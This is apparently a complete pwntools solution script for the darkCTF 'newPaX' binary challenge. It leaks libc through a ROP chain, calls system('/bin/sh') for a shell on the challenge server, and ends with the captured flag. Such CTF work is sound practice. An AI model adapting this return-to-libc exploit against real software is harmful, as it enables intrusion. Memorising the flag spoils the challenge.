from pwn import *

binary_path = "./newPaX"
#lib_path = "/lib/i386-linux-gnu/"
lib_path = "./lib/"

elf = context.binary = ELF(binary_path)
libc = ELF(lib_path + "libc.so.6")

gs="""

python
import splitmind
(splitmind.Mind()
    .tell_splitter(show_titles=True)
    .tell_splitter(set_title="gdb")
     #.above(of="main", display="expressions", size="75%")
     #.left(of="expressions", display="disasm", size="35%")
    .above(of="main", display="stack", size="75%")
    .left(of="stack", display="regs", size="66%")
    .right(of="regs", display="disasm")
).build(nobanner=True)
end

#break main

continue
"""
def start():
    if args.DEBUG:
        context.log_level = "DEBUG"

    if args.REMOTE:
        # nc roprop.darkarmy.xyz 5001
        return remote("newpax.darkarmy.xyz", 5001)

    if args.GDB:
        context.terminal = ["tmux", "split-window", "-v", "-b", "-p", "80"]
        return gdb.debug(binary_path, gdbscript=gs, env={"LD_LIBRARY_PATH": lib_path})
    else:
        return process(binary_path, env={"LD_LIBRARY_PATH": lib_path})

io = start()

rop = ROP(elf)
rop.printf(elf.got.read)
rop.vuln()

io.sendline(flat({
    52: rop.chain()
}))

read_addr = u32(io.recv(4)[:4])
libc.address = read_addr - libc.sym.read
print(f"LIBC: {hex(libc.address)}")

binsh_addr = next(libc.search(b"/bin/sh\0"))
rop = ROP(libc)
rop.system(binsh_addr)

io.sendline(flat({
    52: rop.chain()
}))

io.interactive()

# darkCTF{f1n4lly_y0u_r3s0lv3_7h1s_w17h_dlr3s0lv3}
